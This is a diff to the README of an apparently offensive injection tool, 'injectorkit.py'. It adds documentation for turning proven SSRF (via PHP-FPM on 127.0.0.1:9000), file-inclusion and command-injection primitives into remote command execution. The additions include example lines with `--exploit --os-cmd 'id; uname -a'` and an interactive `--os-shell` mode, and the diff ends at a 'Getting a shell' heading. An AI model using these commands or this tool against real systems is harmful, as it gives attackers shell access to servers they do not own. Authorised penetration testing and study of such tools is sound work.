@@ -23,6 +23,12 @@ what the target will accept, and reports what it proved:
     python injectorkit.py proto -u "http://target/?file=index.php"
     python injectorkit.py cmdi -u "http://target/ping?host=127.0.0.1"
 
+Once a primitive is proved, `--os-cmd` runs a command through it and shows what
+came back - in all three classes, and it appears with the results at the end:
+
+    python injectorkit.py ssrf -u "http://target/fetch?url=http://127.0.0.1:9000/" \
+        --exploit --fpm-script /var/www/html/index.php --os-cmd 'id'
+
 A body is a form post unless you say otherwise, so a parameter behind a form
 takes `--data` rather than a query string:
 
@@ -129,11 +135,18 @@ first. Getting past a filter is not the answer here, so the search keeps climbin
 until something actually runs.
 
 When it does, `--os-cmd` runs one command through the shape that was proved to
-work, and reports honestly if the injection stopped working between proving it
-and using it:
+work, and `--os-shell` keeps it open and runs what you type - from a terminal or
+from a pipe, so a scripted session works. If the injection stops working between
+proving it and using it, the tool says so rather than printing the page as
+output:
 
     python injectorkit.py cmdi -u "http://target/ping?host=127.0.0.1" \
         --exploit --os-cmd 'id; uname -a'
+    python injectorkit.py cmdi -u "http://target/ping?host=127.0.0.1" --exploit --os-shell
+
+What a command printed belongs with the results, so it is shown at the end, under
+`Commands run:`, once - the same place a file that was read appears under
+`Files read:`.
 
 ### Getting a shell
 
